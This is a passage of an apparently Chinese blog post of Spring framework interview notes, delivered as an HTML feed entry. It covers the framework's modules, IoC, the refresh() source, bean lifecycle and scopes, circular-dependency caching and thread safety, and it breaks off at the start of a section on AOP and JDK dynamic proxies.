        <content type="html"><![CDATA[<h1 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h1><h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><p><img src="/./2024/05/26/Spring%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/1.png" alt="结构图"></p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="Core-Container"><a href="#Core-Container" class="headerlink" title="Core Container"></a>Core Container</h3><p>核心容器(Core Container)</p><ul><li><code>spring-beans</code> 该模块是依赖注入IoC与DI的最基本实现</li><li><code>spring-core</code> 该模块是Bean工厂与bean的装配</li><li><code>spring-context</code> 该模块构架于核心模块之上，它扩展了 BeanFactory，为它添加了 Bean 生命周期控制、框架事件体系以及资源加载透明化等功能。ApplicationContext 是该模块的核心接口，它的超类是<br>BeanFactory。与BeanFactory 不同，ApplicationContext 容器实例化后会自动对所有的单实例 Bean 进行实例化与依赖关系的装配，使之处于待用状态</li><li><code>spring-context-indexer</code> 该模块是 Spring 的类管理组件和 Classpath 扫描</li><li><code>spring-context-support</code> 该模块是对 Spring IOC 容器的扩展支持，以及 IOC 子容器</li><li><code>spring-expression</code> 该模块是Spring表达式语言块是统一表达式语言（EL）的扩展模块，可以查询、管理运行中的对象，同时也方便的可以调用对象方法、操作数组、集合等</li></ul><h3 id="Data-Access-Integration"><a href="#Data-Access-Integration" class="headerlink" title="Data Access&#x2F;Integration"></a>Data Access&#x2F;Integration</h3><p>数据访问&#x2F;集成</p><ul><li><code>spring-jdbc</code> 该模块提供了 JDBC抽象层，它消除了冗长的 JDBC 编码和对数据库供应商特定错误代码的解析</li><li><code>spring-tx</code> 该模块支持编程式事务和声明式事务，可用于实现了特定接口的类和所有的 POJO 对象。编程式事务需要自己写beginTransaction()、commit()、rollback()<br>等事务管理方法，声明式事务是通过注解或配置由 spring 自动处理，编程式事务粒度更细</li><li><code>spring-orm</code> 该模块提供了对流行的对象关系映射 API的集成，包括 JPA、JDO 和 Hibernate 等。通过此模块可以让这些 ORM 框架和 spring 的其它功能整合，比如前面提及的事务管理</li><li><code>spring-oxm</code> 该模块提供了对 OXM 实现的支持，比如JAXB、Castor、XML Beans、JiBX、XStream等</li><li><code>spring-jms</code> 该模块包含生产（produce）和消费（consume）消息的功能。从Spring 4.1开始，集成了 spring-messaging 模块</li></ul><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>网络部分</p><ul><li><code>spring-web</code> 该模块为 Spring 提供了最基础 Web 支持，主要建立于核心容器之上，通过 Servlet 或者 Listeners 来初始化 IOC 容器，也包含一些与 Web 相关的支持</li><li><code>spring-webmvc</code> 该模块众所周知是一个的 Web-Servlet 模块，实现了 Spring MVC（model-view-Controller）的 Web 应用</li><li><code>spring-websocket</code> 该模块主要是与 Web 前端的全双工通讯的协议</li><li><code>spring-webflux</code> 该模块是一个新的非堵塞函数式 Reactive Web 框架，可以用来建立异步的，非阻塞，事件驱动的服务，并且扩展性非常好。</li></ul><h3 id="面向切面编程-AOP和Aspects"><a href="#面向切面编程-AOP和Aspects" class="headerlink" title="面向切面编程(AOP和Aspects)"></a>面向切面编程(AOP和Aspects)</h3><ul><li><code>spring-aop</code> 该模块是Spring的另一个核心模块，是 AOP 主要的实现模块</li><li><code>spring-aspects</code> 该模块提供了对 AspectJ 的集成，主要是为 Spring AOP提供多种 AOP 实现方法，如前置方法后置方法等</li></ul><h3 id="设备-Instrumentation"><a href="#设备-Instrumentation" class="headerlink" title="设备(Instrumentation)"></a>设备(Instrumentation)</h3><ul><li><code>spring-instrument</code> 该模块是基于JAVA SE 中的”java.lang.instrument”进行设计的，应该算是 AOP的一个支援模块，主要作用是在 JVM<br>启用时，生成一个代理类，程序员通过代理类在运行时修改类的字节，从而改变一个类的功能，实现 AOP 的功能</li></ul><h3 id="消息-Messaging"><a href="#消息-Messaging" class="headerlink" title="消息(Messaging)"></a>消息(Messaging)</h3><ul><li><code>spring-messaging</code> 是从 Spring4 开始新加入的一个模块，主要职责是为 Spring 框架集成一些基础的报文传送应用</li></ul><h3 id="测试-Test"><a href="#测试-Test" class="headerlink" title="测试(Test)"></a>测试(Test)</h3><ul><li><code>spring-test</code> 主要为测试提供支持的，通过 JUnit 和 TestNG 组件支持单元测试和集成测试。它提供了一致性地加载和缓存 Spring 上下文，也提供了用于单独测试代码的模拟对象（mock object）</li></ul><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><h3 id="IOC是什么？"><a href="#IOC是什么？" class="headerlink" title="IOC是什么？"></a>IOC是什么？</h3><p>控制反转即IoC (Inversion of Control)，它把传统上由程序代码直接操控的对象的调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的“控制反转”概念就是对组件对象控制权的转移，从程序代码本身转移到了外部容器。</p><p>Spring IOC 负责创建对象，管理对象（通过依赖注入（DI），装配对象，配置对象，并且管理这些对象的整个生命周期。</p><h3 id="使用IOC的好处"><a href="#使用IOC的好处" class="headerlink" title="使用IOC的好处"></a>使用IOC的好处</h3><ul><li>不用自己组装，拿来就用。</li><li>享受单例的好处，效率高，不浪费空间</li><li>便于单元测试，方便切换mock组件</li><li>便于进行AOP操作，对于使用者是透明的</li><li>统一配置，便于修改</li></ul><h2 id="BeanFactory-和-ApplicationContext有什么区别"><a href="#BeanFactory-和-ApplicationContext有什么区别" class="headerlink" title="BeanFactory 和 ApplicationContext有什么区别"></a>BeanFactory 和 ApplicationContext有什么区别</h2><p>BeanFactory和ApplicationContext是Spring的两大核心接口，都可以当做Spring的容器。其中ApplicationContext是BeanFactory的子接口。</p><h3 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h3><p>BeanFactory：是Spring里面最底层的接口，包含了各种Bean的定义，读取bean配置文档，管理bean的加载、实例化，控制bean的生命周期，维护bean之间的依赖关系。</p><p>ApplicationContext接口作为BeanFactory的派生，除了提供BeanFactory所具有的功能外，还提供了更完整的框架功能：</p><ul><li>继承MessageSource，因此支持国际化。</li><li>统一的资源文件访问方式。</li><li>提供在监听器中注册bean的事件。</li><li>同时加载多个配置文件。</li><li>载入多个（有继承关系）上下文 ，使得每一个上下文都专注于一个特定的层次，比如应用的web层。</li></ul><h3 id="加载方式"><a href="#加载方式" class="headerlink" title="加载方式"></a>加载方式</h3><p>BeanFactroy采用的是延迟加载形式来注入Bean的，即只有在使用到某个Bean时(调用getBean())<br>，才对该Bean进行加载实例化。这样，我们就不能发现一些存在的Spring的配置问题。如果Bean的某一个属性没有注入，BeanFacotry加载后，直至第一次使用调用getBean方法才会抛出异常。</p><p>ApplicationContext，它是在容器启动时，一次性创建了所有的Bean。这样，在容器启动时，我们就可以发现Spring中存在的配置错误，这样有利于检查所依赖属性是否注入。<br>ApplicationContext启动后预载入所有的单实例Bean，通过预载入单实例bean ,确保当你需要的时候，你就不用等待，因为它们已经创建好了。</p><p>相对于基本的BeanFactory，ApplicationContext 唯一的不足是占用内存空间。当应用程序配置Bean较多时，程序启动较慢。</p><h3 id="创建方式"><a href="#创建方式" class="headerlink" title="创建方式"></a>创建方式</h3><p>BeanFactory通常以编程的方式被创建，ApplicationContext还能以声明的方式创建，如使用ContextLoader。</p><h3 id="注册方式"><a href="#注册方式" class="headerlink" title="注册方式"></a>注册方式</h3><p>BeanFactory和ApplicationContext都支持BeanPostProcessor、BeanFactoryPostProcessor的使用，但两者之间的区别是：BeanFactory需要手动注册，而ApplicationContext则是自动注册。</p><h3 id="Spring-IoC的初始化过程"><a href="#Spring-IoC的初始化过程" class="headerlink" title="Spring IoC的初始化过程"></a>Spring IoC的初始化过程</h3><h4 id="IOC粗略总结"><a href="#IOC粗略总结" class="headerlink" title="IOC粗略总结"></a>IOC粗略总结</h4><ol><li>首先入口是xml或者注解或者其他形式，要实现beanDefinationReader接口，然后 读取的时候，会将他们解析为bean的定义信息；</li><li>beanFactory在加载bean信息实例化（底层用的反射）之前，spring加了一个接口beanFactoryPostProcessor,用作扩展用。</li><li>beanFactory内部实例化bean之后，在要初始化bean对象之前，增加了一个一系列aware接口，将他的容器，以及工厂都暴露出来供使用者做扩展用。</li><li>经过一些列容器以及容器对象的注入之后，在初始化之前，spring又增加了一个接口 beanPostProcessor,该接口是可以作用于所有创建的bean,在初始化前后，均能通过重写该接口获取bean对象进行定制操作。</li><li>经过实现初始化接口完成初始化功能。</li><li>经过实现销毁接口disposableBean结束其生命。</li></ol><h4 id="重要的组件"><a href="#重要的组件" class="headerlink" title="重要的组件"></a>重要的组件</h4><ul><li><code>BeanDefinition</code> 描述bean的属性的接口，例如bean的scope是单例还是多例，构造方法，有哪些property value，依赖等，相当于对这个bean的一份身份描述<ul><li><h2 id="Bean配置-–-BeanDefinition-–-Bean对象"><a href="#Bean配置-–-BeanDefinition-–-Bean对象" class="headerlink" title="Bean配置 –&gt; BeanDefinition –&gt; Bean对象"></a>Bean配置 –&gt; BeanDefinition –&gt; Bean对象</h2>懒加载情况下，refresh只是把BeanDefinition注册到BeanFactory中，而不是把Bean注册到BeanFactory中。在调用上下文的getBean的时候才会去根据BeanDefinition生成具体的bean对象</li></ul></li><li><code>BeanDefinitionMap</code></li><li><code>BeanFactory</code><ul><li>spring的基础bean容器</li><li>相当于存放所有bean的容器</li></ul></li><li><code>ApplicationContext</code><ul><li>BeanFactory 的子接口，在 BeanFactory 的基础上构建，是相对比较高级的 IoC 容器实现。包含 BeanFactory<br>的所有功能，还提供了其他高级的特性，比如：事件发布、国际化信息支持、统一资源加载策略等。正常情况下，我们都是使用的 ApplicationContext</li><li>相当于丰富了beanfactory的功能，这里理解为上下文就好</li></ul></li><li><code>FactoryBean</code></li></ul><h4 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h4><p>首先抛开其他组件的启动，我们只需要引入spring-context就可以启动一个容器了</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而在springboot出来之前最常见的加载bean的方式是读取配置文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span>&#123;</span><br><span class="line">        ApplicationContext context=<span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;classpath:applicationfile.xml&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里ApplicationContext是一个接口，主要的实现类有：</p><ul><li>ClassPathXmlApplicationContext 需要一个 xml 配置文件在系统中的路径</li><li>FileSystemXmlApplicationContext 需要一个 xml 配置文件在系统中的路径</li><li>AnnotationConfigApplicationContext 基于注解，大势所趋</li></ul><p>下面的分析都基于 ClassPathXmlApplicationContext 进行分析，因为比较好理解点</p><p>在 resources 目录新建一个配置文件，文件名随意，通常叫 application.xml 或 application-xxx.xml就可以了,对应的类实现一个：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">default-autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;messageService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.javadoop.example.MessageServiceImpl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>main</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 用我们的配置文件来启动一个 ApplicationContext</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;classpath:application.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;context 启动成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从 context 中取出我们的 Bean，而不是用 new MessageServiceImpl() 这种方式</span></span><br><span class="line">        <span class="type">MessageService</span> <span class="variable">messageService</span> <span class="operator">=</span> context.getBean(MessageService.class);</span><br><span class="line">        <span class="comment">// 这句将输出: hello world</span></span><br><span class="line">        System.out.println(messageService.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在构造方法中的refresh()方法是启动加载整个容器的关键方法</p><p>方法在springboot容器启动时也会加载,方法为</p><ul><li>org.springframework.boot.SpringApplication#run</li><li>org.springframework.boot.SpringApplication#refreshContext</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">refresh</span><span class="params">()</span><span class="keyword">throws</span> BeansException,IllegalStateException&#123;</span><br><span class="line">    <span class="comment">// 1. 首先是一个synchronized加锁，当然要加锁，不然你先调一次refresh()然后这次还没处理完又调一次，就会乱套了；</span></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>.startupShutdownMonitor)&#123;</span><br><span class="line">        <span class="comment">// 2. 这个方法是做准备工作的，记录容器的启动时间、标记“已启动”状态、处理配置文件中的占位符，可以点进去看看，这里就不多说了。</span></span><br><span class="line">        prepareRefresh();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 这个就很重要了，这一步是把配置文件解析成一个个Bean，并且注册到BeanFactory中，注意这里只是注册进去，并没有初始化。先继续往下看，等会展开这个方法详细解读</span></span><br><span class="line">        ConfigurableListableBeanFactory beanFactory=obtainFreshBeanFactory();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. 这个方法的作用是：设置 BeanFactory 的类加载器，添加几个 BeanPostProcessor，手动注册几个特殊的 bean，这里都是spring里面的特殊处理，然后继续往下看</span></span><br><span class="line">        prepareBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 5. 方法是提供给子类的扩展点，到这里的时候，所有的 Bean 都加载、注册完成了，但是都还没有初始化，具体的子类可以在这步的时候添加一些特殊的 BeanFactoryPostProcessor 的实现类，来完成一些其他的操作。</span></span><br><span class="line">            postProcessBeanFactory(beanFactory);</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 6. 接下来是这个方法是调用 BeanFactoryPostProcessor 各个实现类的 postProcessBeanFactory(factory) 方法；</span></span><br><span class="line">            invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 7. 然后这个方法注册 BeanPostProcessor 的实现类，和上面的BeanFactoryPostProcessor 是有区别的，这个方法调用的其实是PostProcessorRegistrationDelegate类的registerBeanPostProcessors方法；</span></span><br><span class="line">            <span class="comment">// 这个类里面有个内部类BeanPostProcessorChecker，BeanPostProcessorChecker里面有两个方法postProcessBeforeInitialization和postProcessAfterInitialization，这两个方法分别在 Bean 初始化之前和初始化之后得到执行。</span></span><br><span class="line">            <span class="comment">// 然后回到refresh()方法中继续往下看</span></span><br><span class="line">            registerBeanPostProcessors(beanFactory);</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 8. 方法是初始化当前 ApplicationContext 的 MessageSource，国际化处理，继续往下</span></span><br><span class="line">            initMessageSource();</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 9. 方法初始化当前 ApplicationContext 的事件广播器继续往下</span></span><br><span class="line">            initApplicationEventMulticaster();</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 10. 方法初始化一些特殊的 Bean（在初始化 singleton beans 之前）；继续往下</span></span><br><span class="line">            onRefresh();</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 11. 方法注册事件监听器，监听器需要实现 ApplicationListener 接口；继续往下</span></span><br><span class="line">            registerListeners();</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 12. 重点到了 初始化所有的 singleton beans（单例bean），懒加载（non-lazy-init）的除外，这个方法也是等会细说</span></span><br><span class="line">            finishBeanFactoryInitialization(beanFactory);</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 13. 方法是最后一步，广播事件，ApplicationContext 初始化完成</span></span><br><span class="line">            finishRefresh();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(BeansException ex)&#123;</span><br><span class="line">            <span class="keyword">if</span>(logger.isWarnEnabled())&#123;</span><br><span class="line">                logger.warn(<span class="string">&quot;Exception encountered during context initialization - &quot;</span>+<span class="string">&quot;cancelling refresh attempt: &quot;</span>+ex);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Destroy already created singletons to avoid dangling resources.</span></span><br><span class="line">            <span class="comment">// 销毁已经初始化的 singleton 的 Beans，以免有些 bean 会一直占用资源</span></span><br><span class="line">            destroyBeans();</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// Reset &#x27;active&#x27; flag.</span></span><br><span class="line">            cancelRefresh(ex);</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// Propagate exception to caller.</span></span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125; <span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="comment">// Reset common introspection caches in Spring&#x27;s core, since we</span></span><br><span class="line">            <span class="comment">// might not ever need metadata for singleton beans anymore...</span></span><br><span class="line">            resetCommonCaches();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Spring-bean的生命周期"><a href="#Spring-bean的生命周期" class="headerlink" title="Spring bean的生命周期"></a>Spring bean的生命周期</h3><p>Spring Bean的生命周期分为四个阶段和多个扩展点。扩展点又可以分为影响多个Bean和影响单个Bean。整理如下：</p><p>四个阶段</p><ul><li>实例化 Instantiation</li><li>属性赋值 Populate</li><li>初始化 Initialization</li><li>销毁 Destruction</li></ul><p>多个扩展点</p><ul><li>影响多个Bean<ul><li>BeanPostProcessor(作用于初始化阶段的前后)</li><li>InstantiationAwareBeanPostProcessor(作用于实例化阶段的前后)</li></ul></li><li>影响单个Bean<ul><li>Aware(Aware类型的接口的作用就是让我们能够拿到Spring容器中的一些资源)<ul><li>Aware Group1<ul><li>BeanNameAware</li><li>BeanClassLoaderAware</li><li>BeanFactoryAware</li></ul></li><li>Aware Group2<ul><li>EnvironmentAware</li><li>EmbeddedValueResolverAware(实现该接口能够获取Spring EL解析器，用户的自定义注解需要支持spel表达式的时候可以使用)</li><li>ApplicationContextAware(ResourceLoaderAware\ApplicationEventPublisherAware\MessageSourceAware)</li></ul></li></ul></li><li>生命周期(实例化和属性赋值都是Spring帮助我们做的，能够自己实现的有初始化和销毁两个生命周期阶段)<ul><li>InitializingBean</li><li>DisposableBean</li></ul></li></ul></li></ul><h3 id="bean的作用域"><a href="#bean的作用域" class="headerlink" title="bean的作用域"></a>bean的作用域</h3><p>Spring Bean 中所说的作用域，在配置文件中即是“scope”</p><p>在面向对象程序设计中作用域一般指对象或变量之间的可见范围。</p><p>而在Spring容器中是指其创建的Bean对象相对于其他Bean对象的请求可见范围。</p><p>在Spring 容器当中，一共提供了5种作用域类型，在配置文件中，通过属性scope来设置bean的作用域范围</p><h4 id="singleton"><a href="#singleton" class="headerlink" title="singleton"></a>singleton</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userInfo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.lovepi.UserInfo&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;singleton&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当Bean的作用域为singleton的时候,Spring容器中只会存在一个共享的Bean实例，所有对Bean的请求只要id与bean的定义相匹配，则只会返回bean的同一实例。单一实例会被存储在单例缓存中，为Spring的缺省作用域。</p><h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userInfo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.lovepi.UserInfo&quot;</span> <span class="attr">scope</span>=<span class="string">&quot; prototype &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>每次对该Bean请求的时候，Spring IoC都会创建一个新的作用域。</p><p>对于有状态的Bean应该使用prototype，对于无状态的Bean则使用singleton</p><h4 id="request"><a href="#request" class="headerlink" title="request"></a>request</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userInfo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.lovepi.UserInfo&quot;</span> <span class="attr">scope</span>=<span class="string">&quot; request &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Request作用域针对的是每次的Http请求，Spring容器会根据相关的Bean的</p><p>定义来创建一个全新的Bean实例。而且该Bean只在当前request内是有效的。</p><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userInfo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.lovepi.UserInfo&quot;</span> <span class="attr">scope</span>=<span class="string">&quot; session &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>针对http session起作用，Spring容器会根据该Bean的定义来创建一个全新的Bean的实例。而且该Bean只在当前http session内是有效的。</p><h4 id="global-session"><a href="#global-session" class="headerlink" title="global session"></a>global session</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userInfo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.lovepi.UserInfo&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;globalSession&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>类似标准的http session作用域，不过仅仅在基于portlet的web应用当中才有意义。Portlet规范定义了全局的Session的概念。他被所有构成某个portlet外部应用中的各种不同的portlet所共享。在global<br>session作用域中所定义的bean被限定于全局的portlet session的生命周期范围之内。</p><h3 id="循环依赖问题"><a href="#循环依赖问题" class="headerlink" title="循环依赖问题"></a>循环依赖问题</h3><h4 id="三级缓存"><a href="#三级缓存" class="headerlink" title="三级缓存"></a>三级缓存</h4><p>Spring 解决循环依赖的核心就是提前暴露对象，而提前暴露的对象就是放置于第二级缓存中。下表是三级缓存的说明：</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>singletonObjects</td><td>一级缓存，存放完整的 Bean。</td></tr><tr><td>earlySingletonObjects</td><td>二级缓存，存放提前暴露的Bean，Bean 是不完整的，未完成属性注入和执行 init 方法。</td></tr><tr><td>singletonFactories</td><td>三级缓存，存放的是 Bean 工厂，主要是生产 Bean，存放到二级缓存中。</td></tr></tbody></table><p>所有被Spring 管理的 Bean，最终都会存放在 singletonObjects 中，这里面存放的 Bean 是经历了所有生命周期的（除了销毁的生命周期），完整的，可以给用户使用的。</p><p>earlySingletonObjects 存放的是已经被实例化，但是还没有注入属性和执行 init 方法的 Bean。</p><p>singletonFactories 存放的是生产 Bean 的工厂。</p><p>Bean 都已经实例化了，为什么还需要一个生产 Bean 的工厂呢？这里实际上是跟 AOP 有关，如果项目中不需要为 Bean 进行代理，那么这个 Bean 工厂就会直接返回一开始实例化的对象，如果需要使用 AOP 进行代理，那么这个工厂就会发挥重要的作用了，这也是本文需要重点关注的问题之一。</p><h4 id="解决循环依赖"><a href="#解决循环依赖" class="headerlink" title="解决循环依赖"></a>解决循环依赖</h4><p>Spring 是如何通过上面介绍的三级缓存来解决循环依赖的呢？这里只用 A，B 形成的循环依赖来举例：</p><ol><li>实例化 A，此时 A 还未完成属性填充和初始化方法（@PostConstruct）的执行，A 只是一个半成品。</li><li>为 A 创建一个 Bean 工厂，并放入到  singletonFactories 中。</li><li>发现 A 需要注入 B 对象，但是一级、二级、三级缓存均为发现对象 B。</li><li>实例化 B，此时 B 还未完成属性填充和初始化方法（@PostConstruct）的执行，B 只是一个半成品。</li><li>为 B 创建一个 Bean 工厂，并放入到  singletonFactories 中。</li><li>发现 B 需要注入 A 对象，此时在一级、二级未发现对象 A，但是在三级缓存中发现了对象 A，从三级缓存中得到对象 A，并将对象 A 放入二级缓存中，同时删除三级缓存中的对象 A。（注意，此时的 A 还是一个半成品，并没有完成属性填充和执行初始化方法）</li><li>将对象 A 注入到对象 B 中。</li><li>对象 B 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 B。（此时对象 B 已经是一个成品）</li><li>对象 A 得到对象 B，将对象 B 注入到对象 A 中。（对象 A 得到的是一个完整的对象 B）</li><li>对象 A 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 A。</li></ol><h2 id="Spring框架中的单例bean是否线程安全"><a href="#Spring框架中的单例bean是否线程安全" class="headerlink" title="Spring框架中的单例bean是否线程安全"></a>Spring框架中的单例bean是否线程安全</h2><p>Spring框架中的单例bean是线程安全的吗？它是如何处理线程并发问题的?</p><p>不是，Spring框架中的单例bean不是线程安全的。</p><p>spring 中的 bean 默认是单例模式，spring 框架并没有对单例 bean 进行多线程的封装处理。实际上大部分 spring bean 是无状态的（比如 dao 类），在某种程度上来说 bean 也是安全的，但如果 bean<br>有状态的话（比如 view model ）就要开发者自己去保证线程安全了，最简单的就是改变 bean 的作用域，把“singleton”变更为“prototype”，这样请求 bean 相当于 new Bean()了， 保证线程安全了。</p><ul><li>有状态就是有数据存储功能。</li><li>无状态就是不会保存数据。</li></ul><p>Spring如何处理线程并发问题?</p><p>一般只有无状态的Bean才可以在多线程下共享，大部分是无状态的Bean。当存有状态的Bean的时候，spring一般是使用ThreadLocal进行处理，解决线程安全问题。</p><p>ThreadLocal和线程同步机制都是为了解决多线程中相同变量的访问冲突问题。 同步机制采用了“时间换空间”的方式，仅提供一份变量，不同的线程获取锁，没获得锁的线程则需要排队。而ThreadLocal采用了“空间换时间”的方式。<br>ThreadLocal会为每一个线程提供一个独立的变量副本，从而隔离了多个线程对数据的访问冲突。因为每一个线程都拥有自己的变量副本，所以没有相同变量的访问冲突问题。所以在编写多线程代码时，可以把不安全的变量封装进ThreadLocal。</p><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><p>OOP(Object-Oriented Programming)面向对象编程，允许开发者定义纵向的关系，但并适用于定义横向的关系，导致了大量代码的重复，而不利于各个模块的重用。</p><p>AOP(Aspect-Oriented Programming)<br>，一般称为面向切面编程，作为面向对象的一种补充，用于将那些与业务无关，但却对多个对象产生影响的公共行为和逻辑，抽取并封装为一个可重用的模块，这个模块被命名为“切面”（Aspect），减少系统中的重复代码，降低了模块间的耦合度，同时提高了系统的可维护性。可用于权限认证、日志、事务处理等。</p><h3 id="AOP原理"><a href="#AOP原理" class="headerlink" title="AOP原理"></a>AOP原理</h3><p>原理是在IOC过程中，创建bean实例时，最后都会对bean进行处理来实现增强，对于AOP来说就是创建代理类</p><ul><li>底层是动态代理技术<ul><li>JDK动态代理(基于接口)</li><li>CGLib动态代理(基于类)</li><li>在Spring AOP中，如果使用的是单例，推荐使用CGLib代理</li></ul></li></ul><h3 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" 